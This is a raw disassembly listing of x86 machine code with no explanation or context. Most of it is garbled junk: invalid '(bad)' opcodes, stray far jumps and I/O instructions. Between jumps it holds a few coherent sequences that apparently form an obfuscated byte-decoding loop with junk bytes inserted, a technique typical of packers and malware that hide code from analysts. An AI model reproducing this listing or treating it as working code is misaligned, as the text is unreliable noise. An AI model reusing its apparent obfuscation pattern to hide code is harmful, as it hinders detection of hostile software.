  406ae0:	xchg   ecx,eax
  406ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ae2:	cld    
  406ae3:	nop
  406ae4:	jmp    0x3089:0xc8f6945
  406aeb:	inc    eax
  406aec:	sub    DWORD PTR [eax-0x45],edi
  406aef:	cwde   
  406af0:	data16 scas al,BYTE PTR es:[edi]
  406af2:	cmc    
  406af3:	fld    TBYTE PTR [esi]
  406af5:	cmp    al,0xbb
  406af7:	ja     0x406b16
  406af9:	xchg   BYTE PTR [edx+eax*1],bl
  406afc:	xor    dh,BYTE PTR [esp+ebp*4-0xc]
  406b00:	and    BYTE PTR [edx],bl
  406b02:	arpl   WORD PTR [ebx-0x6cd12022],di
  406b08:	addr16 dec ecx
  406b0a:	fadd   QWORD PTR [ecx]
  406b0c:	sbb    dh,0x66
  406b0f:	mov    edi,0xf5885b9d
  406b14:	ret    0x50b1
  406b17:	pop    ebx
  406b18:	test   DWORD PTR [ebx+0x15],esp
  406b1b:	dec    eax
  406b1c:	adc    BYTE PTR [esi-0x23dd89fc],al
  406b22:	pop    ebp
  406b23:	(bad)  
  406b25:	xchg   bl,bh
  406b27:	clc    
  406b28:	out    dx,eax
  406b29:	add    DWORD PTR [edx-0x691bae14],ebx
  406b2f:	shl    BYTE PTR [ebx],cl
  406b31:	sub    BYTE PTR [edi+0x7092d0de],al
  406b37:	add    bh,BYTE PTR [ecx]
  406b39:	xchg   edx,eax
  406b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b3b:	adc    eax,DWORD PTR [edi-0x37304f6b]
  406b41:	cdq    
  406b42:	dec    eax
  406b43:	mov    BYTE PTR [ecx+edi*2-0x4cc407ee],dh
  406b4a:	dec    eax
  406b4b:	daa    
  406b4c:	mov    ah,0x3
  406b4e:	shr    ecx,1
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x43e3c81b],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b6f
  406b8f:	cld    
  406b90:	call   0x86d:0xc3dec02d
  406b97:	pusha  
  406b98:	js     0x406b43
  406b9a:	cmp    DWORD PTR [ebp-0x48],ecx
  406b9d:	sub    DWORD PTR [ebp-0x71],eax
  406ba0:	inc    edx
  406ba1:	xchg   ecx,eax
  406ba2:	sub    eax,0x5a6bc7b6
  406ba7:	fadd   QWORD PTR [ebp+0x58232f1b]
  406bad:	retf   
  406bae:	neg    BYTE PTR [ecx-0xa]
  406bb1:	dec    edi
  406bb2:	adc    eax,DWORD PTR [edx-0x17139bc6]
  406bb8:	or     edx,DWORD PTR [edi]
  406bba:	inc    edx
  406bbb:	push   esi
  406bbc:	stos   DWORD PTR es:[edi],eax
  406bbd:	out    0x65,eax
  406bbf:	pop    ss
  406bc0:	cmp    al,0x51
  406bc2:	jne    0x406c0d
  406bc4:	cmp    dl,dl
  406bc6:	lods   al,BYTE PTR ds:[esi]
  406bc7:	jmp    0xa5e4:0x4dedb224
  406bce:	mov    esi,0xada5913e
  406bd3:	or     ah,BYTE PTR [esi-0x3c]
  406bd6:	xchg   edx,eax
  406bd7:	add    DWORD PTR [edx-0x27],0x28c8aadd
  406bde:	bound  esi,QWORD PTR [esi+0x79]
  406be1:	dec    edi
  406be2:	fdivr  st,st(1)
  406be4:	dec    edi
  406be5:	dec    ecx
  406be6:	or     ecx,DWORD PTR [ebx]
  406be8:	inc    BYTE PTR [ebx+edx*4-0x4c15ecb5]
  406bef:	in     eax,dx
  406bf0:	int3   
  406bf1:	fimul  WORD PTR [esp+ebx*1]
  406bf4:	pop    esp
  406bf5:	(bad)  
  406bf7:	push   es
  406bf8:	mov    esi,0x984f30ac
  406bfd:	loope  0x406c48
  406bff:	jns    0x406bcd
  406c01:	rol    DWORD PTR [ebx+0x51],0x8a
  406c05:	adc    al,0xa
  406c07:	dec    ebx
  406c08:	test   BYTE PTR [edx+0x3b],0x32
  406c0c:	popa   
  406c0d:	push   edi
  406c0e:	push   eax
  406c0f:	rcr    DWORD PTR [ecx+0x1a],cl
  406c12:	pop    eax
  406c13:	xor    eax,0xb3d66548
  406c18:	scas   eax,DWORD PTR es:[edi]
  406c19:	fdiv   QWORD PTR ds:0x36f868e5
  406c1f:	cmp    DWORD PTR [ebp+0x1d357666],0xffffffaa
  406c26:	enter  0x5ef7,0x26
  406c2a:	dec    ebp
  406c2b:	cld    
  406c2c:	add    al,0xa8
  406c2e:	addr16 stc 
  406c30:	xchg   edi,eax
  406c31:	pop    edi
  406c32:	xor    bl,BYTE PTR [ecx+0x5c30faa7]
  406c38:	cmp    eax,0x3b79f630
  406c3d:	sahf   
  406c3e:	jecxz  0x406bd9
  406c40:	cwde   
  406c41:	clc    
  406c42:	(bad)  
  406c43:	dec    ecx
  406c44:	lahf   
  406c45:	fs scas eax,DWORD PTR es:[edi]
  406c47:	nop
  406c48:	mov    ds:0xe77e23f6,eax
  406c4d:	jge    0x406bd2
  406c4f:	dec    edx
  406c50:	mov    eax,0x51d7fdd4
  406c55:	inc    ebx
  406c56:	cmp    DWORD PTR [ecx],ecx
  406c58:	retf   0xec03
  406c5b:	sbb    DWORD PTR [ebp+0x28],edx
  406c5e:	mov    eax,ds:0x8eb38ecf
  406c63:	jle    0x406cd9
  406c65:	and    al,BYTE PTR [ebx+0x8]
  406c68:	mov    cs,WORD PTR [edi-0x4c]
  406c6b:	into   
  406c6c:	xchg   esp,eax
  406c6d:	iret   
  406c6e:	inc    edx
  406c6f:	xchg   esp,eax
  406c70:	or     dh,BYTE PTR [edi-0x2d]
  406c73:	sbb    eax,esi
  406c75:	pushf  
  406c76:	mov    BYTE PTR [edx],dh
  406c78:	into   
  406c79:	xchg   ecx,eax
  406c7a:	cwde   
  406c7b:	es pop esp
  406c7d:	mov    al,0x10
  406c7f:	add    al,BYTE PTR [ecx-0x15daa115]
  406c85:	xchg   ecx,eax
  406c86:	inc    edx
  406c87:	in     eax,0x51
  406c89:	mov    ds:0xe33abb39,al
  406c8e:	sahf   
  406c8f:	adc    eax,0xc8b91a06
  406c94:	xchg   DWORD PTR [ecx+edx*1-0x34],esp
  406c98:	add    DWORD PTR [ebx-0xe9c9715],ecx
  406c9e:	lds    esi,FWORD PTR [eax]
  406ca0:	enter  0x7057,0x94
  406ca4:	mov    ebx,0xd4722146
  406ca9:	stc    
  406caa:	cmp    ebp,DWORD PTR [eax+0x5bbf0f41]
  406cb0:	pop    ds
  406cb1:	adc    eax,0x3195c6ff
  406cb6:	push   ds
  406cb7:	rep stos BYTE PTR es:[edi],al
  406cb9:	ja     0x406c48
  406cbb:	pushf  
  406cbc:	adc    BYTE PTR ds:0x87412f02,al
  406cc2:	aas    
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss call 0x94b87297
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406d13
  406cfc:	xor    esp,ecx
  406cfe:	repnz mov ebx,0xd4c65fc0
  406d04:	lds    esi,FWORD PTR [edx]
  406d06:	(bad)  
  406d08:	push   ss
  406d09:	sbb    DWORD PTR [ecx],ebp
  406d0b:	mov    esi,0x78b950f6
  406d10:	out    0x10,al
  406d12:	mov    eax,0xd3801c
  406d17:	nop
  406d18:	sbb    dl,0xb7
  406d1b:	jb     0x406d51
  406d1d:	sbb    ecx,DWORD PTR [ebx+0x76]
  406d20:	test   al,0x15
  406d22:	sbb    ebx,DWORD PTR [ebp+0x7cff665b]
  406d28:	or     ah,BYTE PTR ds:0x9797b05e
  406d2e:	adc    eax,0xecef070
  406d33:	pop    eax
  406d34:	shl    DWORD PTR [ebx],cl
  406d36:	enter  0x59d2,0x76
  406d3a:	ds dec esi
  406d3c:	cdq    
  406d3d:	into   
  406d3e:	adc    BYTE PTR [edx-0x748d5e9b],0xba
  406d45:	out    dx,al
  406d46:	mov    eax,0xa280aedf
  406d4b:	adc    dl,0x63
  406d4e:	(bad)  
  406d4f:	into   
  406d50:	popa   
  406d51:	scas   al,BYTE PTR es:[edi]
  406d52:	sub    esp,DWORD PTR [eax]
  406d54:	mov    al,ds:0x880d522b
  406d59:	fsubr  QWORD PTR [edx]
  406d5b:	stos   DWORD PTR es:[edi],eax
  406d5c:	out    dx,al
  406d5d:	sub    bl,bl
  406d5f:	test   BYTE PTR [ecx-0x7b],ah
  406d62:	stos   BYTE PTR es:[edi],al
  406d63:	mov    ebp,0x32a46ec0
  406d68:	mov    ah,0xcb
  406d6a:	stos   BYTE PTR es:[edi],al
  406d6b:	xchg   DWORD PTR [eax+0x59],ebp
  406d6e:	push   ds
  406d6f:	mov    al,0x79
  406d71:	pop    eax
  406d72:	and    DWORD PTR [edx-0x28],edx
  406d75:	mov    eax,0x1499ec5c
  406d7a:	mov    es,WORD PTR [ebx+0x5a]
  406d7d:	sti    
  406d7e:	imul   ebx,DWORD PTR [esi+0x65fa07de],0xca2888e1
  406d88:	and    eax,0xaed23757
  406d8d:	jmp    0x2be52b7
  406d92:	mov    al,0x6f
  406d94:	mov    ebp,0x7490fd6a
  406d99:	sub    al,0x9c
  406d9b:	cmp    DWORD PTR [ecx-0x47748e49],ecx
  406da1:	jb     0x406e0e
  406da3:	fcomp  QWORD PTR [edi+edi*4-0x39]
  406da7:	fstp   st(5)
  406da9:	int    0x28
  406dab:	dec    edi
  406dac:	mov    DWORD PTR [ecx+0x50],0x16546c9e
  406db3:	(bad)  
  406db4:	sbb    eax,0x36c054e5
  406db9:	xchg   ebp,eax
  406dba:	lea    esi,[eax-0x6f]
  406dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dbe:	add    edi,DWORD PTR [eax+ebp*1+0x3f]
  406dc2:	push   eax
  406dc3:	lock mov dh,0xa8
  406dc6:	pop    esi
  406dc7:	inc    esi
  406dc8:	jmp    0x406db1
  406dca:	(bad)  
  406dcb:	cmc    
  406dcc:	and    al,0x17
  406dce:	lock loope 0x406d51
  406dd1:	xor    eax,0xfbaaa495
  406dd6:	int3   
  406dd7:	in     eax,0x1c
  406dd9:	and    al,BYTE PTR [esi]
  406ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ddc:	push   ss
  406ddd:	shr    esi,cl
  406ddf:	jecxz  0x406e2f
  406de1:	mov    ebp,0x48442b93
  406de6:	mov    ah,0xec
  406de8:	xchg   esi,eax
  406de9:	ret    0xb645
  406dec:	mov    edi,0xb3d975c4
  406df1:	fs (bad) 
  406df3:	mov    BYTE PTR [esi],0x48
  406df6:	rol    DWORD PTR [ecx+eiz*2-0x5edc4b65],0x77
  406dfe:	lods   al,BYTE PTR ds:[esi]
  406dff:	pop    esi
  406e00:	pop    es
  406e01:	pop    edx
  406e02:	mov    edi,0x106c0445
  406e07:	mov    WORD PTR [eax+0x51bed3e9],es
  406e0d:	iret   
  406e0e:	xor    DWORD PTR [ebp*4-0x4804c5a8],ebx
  406e15:	add    BYTE PTR [ecx],cl
  406e17:	xchg   ecx,eax
  406e18:	call   0x6e7c:0x9bc18b6d
  406e1f:	mov    ch,0x53
  406e21:	or     eax,0x85e341b1
  406e26:	(bad)  
  406e27:	je     0x406db0
  406e29:	out    0x8d,al
  406e2b:	fild   WORD PTR [ebx]
  406e2d:	dec    edx
  406e2e:	xor    ecx,esi
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	loope  0x406e11
  406e4a:	out    dx,eax
  406e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e4c:	pop    ecx
  406e4d:	add    al,0x7e
  406e4f:	jle    0x406e74
  406e51:	jg     0x406ed1
  406e53:	jle    0x406e65
  406e55:	out    dx,al
  406e56:	mov    ds:0x40a08e94,eax
  406e5b:	mov    edx,0xbabcde3c
  406e60:	or     ebx,DWORD PTR [esi+0x3b]
  406e63:	jl     0x406e7c
  406e65:	pop    ss
  406e66:	cmp    eax,0x767906b6
  406e6b:	repz add al,BYTE PTR [esi]
  406e6e:	adc    BYTE PTR [ebx-0x38],dl
  406e71:	mov    dh,0x60
  406e73:	test   eax,0x243d6ef4
  406e78:	pusha  
  406e79:	push   0x3
  406e7b:	push   ebp
  406e7c:	mov    esi,0x54298bf0
  406e81:	jmp    0x406e46
  406e83:	or     BYTE PTR [esi-0x72],ah
  406e86:	adc    al,0x8c
  406e88:	je     0x406e4d
  406e8a:	call   0xdec67644
  406e8f:	push   ecx
  406e90:	(bad)  
  406e91:	jl     0x406e6f
  406e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e94:	icebp  
  406e95:	jmp    0x4dc0:0xb0e187fe
  406e9c:	stos   DWORD PTR es:[edi],eax
  406e9d:	fld    st(7)
  406e9f:	add    DWORD PTR [ebp+esi*1-0x42cb5e6e],0xfffffff6
  406ea7:	stc    
  406ea8:	frstor [ecx+0x3c41f17d]
  406eae:	xchg   edx,eax
  406eaf:	and    ah,BYTE PTR [eax+0x3f]
  406eb2:	mov    ch,0x68
  406eb4:	jg     0x406eaf
  406eb6:	jmp    0x406e7e
  406eb8:	js     0x406ee4
  406eba:	cmp    ebx,DWORD PTR [esi+0x31]
  406ebd:	jb     0x406e64
  406ebf:	jo     0x406ec1
  406ec1:	imul   ebx,DWORD PTR [edx],0x7cc6dc42
  406ec7:	jp     0x406eb2
  406ec9:	call   0xe90e:0x425d12f4
  406ed0:	push   ss
  406ed1:	adc    eax,0x67587367
  406ed6:	(bad)  
  406ed7:	in     al,0xc2
  406ed9:	loop   0x406f24
  406edb:	(bad)  
  406edd:	cs dec ebp
  406edf:	pop    eax
  406ee0:	clc    
  406ee1:	add    BYTE PTR [ebx+0x10],dl
  406ee4:	jg     0x406f5d
  406ee6:	dec    edx
  406ee7:	test   eax,0x392ee413
  406eec:	dec    edx
  406eed:	lahf   
  406eee:	mov    ecx,0x8c5ff230
  406ef3:	push   0xba14b674
  406ef8:	fcomp  DWORD PTR es:[esi-0x66020583]
  406eff:	(bad)  
  406f01:	into   
  406f02:	sub    ch,BYTE PTR [edx*2+0x3d67a30f]
  406f09:	push   ecx
  406f0a:	dec    ebx
  406f0b:	adc    esi,DWORD PTR [ebp+0x653b35f9]
  406f11:	mov    ah,BYTE PTR [esi]
  406f13:	clc    
  406f14:	add    DWORD PTR [edi+0x41],0x5d
  406f18:	out    dx,eax
  406f19:	sub    eax,0x8c6200e2
  406f1e:	jo     0x406f56
  406f20:	(bad)  
  406f21:	xchg   edx,eax
  406f22:	xchg   edx,eax
  406f23:	pop    esp
  406f24:	add    al,0x25
  406f26:	jns    0x406f0c
  406f28:	lahf   
  406f29:	imul   ebp,edi,0xffffffd8
  406f2c:	repnz xor DWORD PTR [ecx+0x5db0630f],0x3d2707fd
  406f37:	push   edx
  406f38:	idiv   DWORD PTR [ecx]
  406f3a:	push   esi
  406f3b:	les    edi,FWORD PTR [esi-0x1d]
  406f3e:	mov    ecx,0xdb4b63d5
  406f43:	cmc    
  406f44:	inc    ebx
  406f45:	pop    edx
  406f46:	sub    DWORD PTR [ebp-0x3c2d5b58],esi
  406f4c:	sahf   
  406f4d:	retf   0xbce0
  406f50:	cdq    
  406f51:	setno  cl
  406f54:	test   edx,edi
  406f56:	sub    DWORD PTR ds:0xe3431b0a,ebx
  406f5c:	leave  
  406f5d:	fnstcw WORD PTR [ebx]
  406f5f:	call   0xb403500b
  406f64:	jb     0x406f0a
  406f66:	int    0x8b
  406f68:	ret    
  406f69:	ja     0x406efa
  406f6b:	cmp    esp,ebx
  406f6d:	fdivr  st,st(2)
  406f6f:	pmaxub mm2,QWORD PTR [ebp-0x745747a2]
  406f76:	outs   dx,BYTE PTR ds:[esi]
  406f77:	jle    0x406fdf
  406f79:	rol    DWORD PTR [ebx+edi*4-0x4950e4d8],0x88
  406f81:	aad    0x7d
  406f83:	nop
  406f84:	icebp  
  406f85:	in     eax,0xf6
  406f87:	ss sub eax,0x8b0b558a
  406f8d:	jge    0x406f77
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	dec    ecx
  407010:	mov    al,0x63
  407012:	rol    BYTE PTR [edx],0x1a
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x406fca
  40701c:	out    0xf9,eax
  40701e:	mov    esp,0xe88bfab2
  407023:	or     BYTE PTR [edx],dh
  407025:	inc    edi
  407026:	push   0x7581e120
  40702b:	inc    ebx
  40702c:	retf   
  40702d:	mov    ds,ebx
  40702f:	ja     0x406ffd
  407031:	add    al,0x4a
  407033:	xor    ah,BYTE PTR ds:0xb0b7f12f
  407039:	mov    dh,ch
  40703b:	retf   
  40703c:	lods   al,BYTE PTR ds:[esi]
  40703d:	xor    BYTE PTR [ebp-0x63],bh
  407040:	sub    BYTE PTR ds:[esi],0x1c
  407044:	adc    al,0xa9
  407046:	add    BYTE PTR [ecx+esi*8+0x639f0411],0xc1
  40704e:	mov    ?,WORD PTR [edx]
  407050:	inc    eax
  407051:	sub    dh,BYTE PTR [edi+0x58d1cd64]
  407057:	mov    ah,0xce
  407059:	inc    ebx
  40705a:	leave  
  40705b:	imul   ebp,DWORD PTR [ebp+0x26192e5c],0x54e46c0b
  407065:	inc    esi
  407066:	dec    eax
  407067:	outs   dx,DWORD PTR ds:[esi]
  407068:	mov    ebp,0xf49cea1e
  40706d:	inc    edx
  40706e:	test   eax,0x5403e213
  407073:	bound  edx,QWORD PTR [esi]
  407075:	(bad)
  407079:	pop    ebp
  40707a:	in     eax,dx
  40707b:	xchg   ebx,eax
  40707c:	test   al,0x4d
  40707e:	test   BYTE PTR [edx+0x35503141],ah
  407084:	sbb    eax,0xa1774c9f
  407089:	push   ecx
  40708a:	inc    edx
  40708b:	cmp    eax,0xfb9345ab
  407090:	(bad)  
  407092:	iret   
  407093:	xchg   edi,eax
  407094:	xlat   BYTE PTR ds:[ebx]
  407095:	iret   
  407096:	stos   DWORD PTR es:[edi],eax
  407097:	cs (bad) 
  40709a:	sub    BYTE PTR [ebx+eiz*2+0x22149f33],cl
  4070a1:	dec    ebp
  4070a2:	mov    eax,0xad11458a
  4070a7:	or     BYTE PTR [edi+0x319733da],al
  4070ad:	adc    DWORD PTR [eax],eax
  4070af:	cdq    
  4070b0:	cmp    DWORD PTR [esi+0x69dac457],eax
  4070b6:	adc    DWORD PTR [ebx],edi
  4070b8:	push   eax
  4070b9:	retf   
  4070ba:	mov    esi,edx
  4070bc:	inc    edx
  4070bd:	jmp    0xe937:0xe6dd6484
  4070c4:	push   0xffffffed
  4070c6:	push   edx
  4070c7:	ret    0xefa
  4070ca:	scas   eax,DWORD PTR es:[edi]
  4070cb:	and    dl,0xab
  4070ce:	jno    0x40707f
  4070d0:	rcl    ebx,0xd7
  4070d3:	loope  0x4070c5
  4070d5:	bswap  ebx
  4070d7:	adc    BYTE PTR [edi+0x4f925ed6],0x1f
  4070de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070df:	(bad)  
  4070e1:	inc    ebp
  4070e2:	mov    dh,0xa5
  4070e4:	sbb    edi,DWORD PTR [edx]
  4070e6:	mov    esp,0x22d5a1f1
  4070eb:	add    BYTE PTR fs:[eax+0x6dcd6b8],ch
  4070f2:	push   ebx
  4070f3:	cli    
  4070f4:	ss push esi
  4070f6:	retf   0xeccc
  4070f9:	cmp    eax,0x72e12552
  4070fe:	inc    ecx
  4070ff:	xor    al,0x2c
  407101:	cmp    eax,0xcf2ff42d
  407106:	add    ah,BYTE PTR [ebp+0x6051659]
  40710c:	pop    eax
  40710d:	dec    edi
  40710e:	(bad)  
  407110:	jne    0x407162
  407112:	aaa    
  407113:	jl     0x40718b
  407115:	test   DWORD PTR [edi+0x3ba7ae12],eax
  40711b:	mov    esi,esp
  40711d:	lods   eax,DWORD PTR ds:[esi]
  40711e:	sbb    DWORD PTR [esp+ebp*4-0x2ef972f2],ecx
  407125:	mov    eax,0x9be65a6d
  40712a:	sbb    al,0x85
  40712c:	outs   dx,BYTE PTR ds:[esi]
  40712d:	sbb    eax,0xb61521d0
  407132:	cs pushw es
  407135:	cwde   
  407136:	inc    esp
  407137:	addr16 dec ecx
  407139:	ins    DWORD PTR es:[edi],dx
  40713a:	jnp    0x4070bd
  40713c:	in     al,0xa
  40713e:	lods   al,BYTE PTR ds:[esi]
  40713f:	xchg   edi,eax
  407140:	out    0xa,al
  407142:	jnp    0x40710d
  407144:	sar    DWORD PTR [ebx+0xacd23a1],cl
  40714a:	jb     0x4070cc
  40714c:	mov    ebx,0x365d15d
  407151:	xlat   BYTE PTR ds:[ebx]
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0xda
  407180:	pusha  
  407181:	ins    DWORD PTR es:[edi],dx
  407182:	out    dx,al
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x40719c
  40718c:	mov    bh,0x68
  40718e:	popf   
  40718f:	adc    BYTE PTR [eax+esi*8-0x726e2368],0x3c
  407197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407198:	xchg   edx,eax
  407199:	xchg   edx,eax
  40719a:	out    dx,eax
  40719b:	(bad)  
  40719c:	xor    ebx,DWORD PTR [ebx]
  40719e:	loope  0x407160
  4071a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071a1:	inc    esp
  4071a2:	cwde   
  4071a3:	ja     0x4071a2
  4071a5:	test   BYTE PTR [esi+0x4e74c8b5],dh
  4071ab:	sub    bh,BYTE PTR [ebp+0x5c]
  4071ae:	jmp    0x4071a3
  4071b0:	add    DWORD PTR [ecx],edx
  4071b2:	loop   0x4071c9
  4071b4:	popa   
  4071b5:	lock xor DWORD PTR [ebx-0x27],ecx
  4071b9:	shr    BYTE PTR [edx],1
  4071bb:	repz je 0x407162
  4071be:	cmp    eax,0xb83c7d0b
  4071c3:	sub    dh,ah
  4071c5:	or     DWORD PTR [edi],ebp
  4071c7:	fidivr DWORD PTR [eax-0x3d]
  4071ca:	mov    ebx,0xa1f1e35b
  4071cf:	xor    dl,BYTE PTR [esi+ecx*8-0x1ddb01a3]
  4071d6:	xlat   BYTE PTR ds:[ebx]
  4071d7:	cli    
  4071d8:	jb     0x4071c7
  4071da:	mov    esp,0xc34da6f2
  4071df:	loopne 0x407226
  4071e1:	stos   DWORD PTR es:[edi],eax
  4071e2:	loop   0x4071e4
  4071e4:	cmp    BYTE PTR [edx-0x4ff91ca2],ch
  4071ea:	enter  0x725d,0xd5
  4071ee:	xchg   ebx,eax
  4071ef:	xor    eax,0x2bbd4704
  4071f4:	adc    DWORD PTR ds:[edx-0x389c99a3],ecx
  4071fb:	dec    edi
  4071fc:	cmp    BYTE PTR [edx+0x5c],dh
  4071ff:	mov    ds:0x1b6eadc6,eax
  407204:	cwde   
  407205:	sbb    al,BYTE PTR [ebx+0xf]
  407208:	jl     0x407241
  40720a:	push   0x53
  40720c:	jno    0x407201
  40720e:	pop    ebp
  40720f:	mov    eax,0xf773754b
  407214:	mov    ch,0x6b
  407216:	jns    0x407250
  407218:	and    al,0xcd
  40721a:	imul   DWORD PTR [edi+0x7b93d8fa]
  407220:	xchg   ebp,eax
  407221:	cmp    eax,0x7af8210f
  407226:	sbb    cl,BYTE PTR ds:[edx-0x9]
  40722a:	cmp    BYTE PTR [edi-0x6844b7db],al
  407230:	add    eax,0xf9fccbfa
  407235:	mov    ebp,edx
  407237:	mov    WORD PTR [esp+edx*2-0x13],gs
  40723b:	adc    edi,DWORD PTR [ebp+0x3685be5a]
  407241:	psubq  mm4,mm3
  407244:	add    DWORD PTR [eax],eax
  407246:	enter  0xb7ed,0x1c
  40724a:	test   BYTE PTR [edx],ah
  40724c:	scas   al,BYTE PTR es:[edi]
  40724d:	pop    ecx
  40724e:	clc    
  40724f:	and    bh,BYTE PTR [ebx]
  407251:	jl     0x407298
  407253:	ins    DWORD PTR es:[edi],dx
  407254:	cmp    BYTE PTR [ecx+ecx*1+0x58d69811],al
  40725b:	mov    dl,0xa7
  40725d:	cmp    BYTE PTR [esi-0x52],ch
  407260:	mov    esi,0xbc8813fb
  407265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407266:	jns    0x407232
  407268:	shl    edx,0xaa
  40726b:	sub    bh,dl
  40726d:	pop    ecx
  40726e:	daa    
  40726f:	cmp    esp,DWORD PTR [esi+edi*8]
  407272:	or     edx,DWORD PTR [esi+0x32f44b4e]
  407278:	ret    
  407279:	mov    eax,ds:0xf91cb014
  40727e:	aam    0x75
  407280:	dec    esp
  407281:	mov    esp,0xf1686b4a
  407286:	(bad)  
  407287:	(bad)  
  407288:	cmp    esp,ebx
  40728a:	scas   al,BYTE PTR es:[edi]
  40728b:	lock or DWORD PTR [edi-0x45],esi
  40728f:	rcl    DWORD PTR [edx],0x8c
  407292:	mov    ds:0xf3e0f676,eax
  407297:	sub    eax,0xbdc4591
  40729c:	loopne 0x4072a9
  40729e:	or     dh,0x7c
  4072a1:	sahf   
  4072a2:	rcl    BYTE PTR [ebx],1
  4072a4:	je     0x4072e8
  4072a6:	in     eax,dx
  4072a7:	and    eax,0x668b81ab
  4072ac:	aam    0x46
  4072ae:	iret   
  4072af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b0:	and    ebx,ebp
  4072b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b3:	loop   0x40728d
  4072b5:	ins    BYTE PTR es:[edi],dx
  4072b6:	inc    esi
  4072b7:	js     0x40732a
  4072b9:	test   ch,bl
  4072bb:	dec    edi
  4072bc:	sbb    BYTE PTR [edx-0x31],cl
